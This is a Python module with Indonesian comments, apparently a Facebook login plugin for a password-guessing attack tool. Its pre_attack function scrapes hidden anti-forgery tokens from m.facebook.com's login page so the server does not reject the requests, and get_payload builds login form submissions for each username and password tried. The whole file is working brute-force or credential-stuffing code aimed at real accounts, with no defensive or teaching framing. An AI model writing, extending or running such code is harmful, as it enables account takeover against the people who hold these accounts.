import re

# Global storage untuk token sesi
SESSION_DATA = {
    "lsd": "",
    "jazoest": "",
    "m_ts": "",
    "li": ""
}

def get_config():
    return {
        # Gunakan mbasic atau m.facebook untuk overhead lebih kecil
        "url": "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100",
        "platform": "facebook"
    }

async def pre_attack(client, username):
    """
    Mengambil token LSD, jazoest, dll dari halaman login sebelum serangan dimulai.
    Tanpa ini, semua request akan ditolak server.
    """
    try:
        resp = await client.get("https://m.facebook.com/login/")
        if resp.status_code == 200:
            text = resp.text
            # Regex sederhana untuk scraping token hidden input
            lsd = re.search(r'name="lsd" value="(.*?)"', text)
            jazoest = re.search(r'name="jazoest" value="(.*?)"', text)
            m_ts = re.search(r'name="m_ts" value="(.*?)"', text)
            li = re.search(r'name="li" value="(.*?)"', text)
            
            if lsd: SESSION_DATA["lsd"] = lsd.group(1)
            if jazoest: SESSION_DATA["jazoest"] = jazoest.group(1)
            if m_ts: SESSION_DATA["m_ts"] = m_ts.group(1)
            if li: SESSION_DATA["li"] = li.group(1)
            
    except Exception as e:
        print(f"[!] Token Fetch Error: {e}")

def get_payload(username, password):
    # Payload yang diperbarui dengan token
    return {
        "lsd": SESSION_DATA.get("lsd", ""),
        "jazoest": SESSION_DATA.get("jazoest", ""),
        "m_ts": SESSION_DATA.get("m_ts", ""),
        "li": SESSION_DATA.get("li", ""),
        "try_number": "0",
        "unrecognized_tries": "0",
        "email": username,
        "pass": password,
        "login": "Log In",
        "bi_xrwh": "0" 
    }
